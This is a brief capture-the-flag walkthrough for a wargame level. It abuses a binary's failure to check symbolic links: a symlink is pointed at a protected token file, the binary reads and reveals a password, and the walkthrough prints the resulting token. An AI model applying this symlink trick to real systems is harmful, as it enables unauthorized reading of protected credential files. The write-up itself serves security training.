# Level08 Walkthrough

## Overview

This level exploits a file access vulnerability where the binary reads from a user-supplied path without properly validating symbolic links.

## Walkthrough

### 1. Create a symbolic link

Point a symlink to the protected token file:

```bash id="a4k9qp"
ln -sf /home/user/level08/token /tmp/flag08
```

### 2. Execute the vulnerable binary

Pass the symlink as an argument:

```bash id="b7v2ls"
./level08 /tmp/flag08
```

* The program follows the symlink and reveals the password.

### 3. Switch user

Use the retrieved password:

```bash id="c3x8rt"
su flag08
```

### 4. Retrieve the flag

```bash id="d6k1ws"
getflag
```

## Token

```text id="e9p4zu"
25749xKZ8L7DkSCwJkT9dyv6f
```

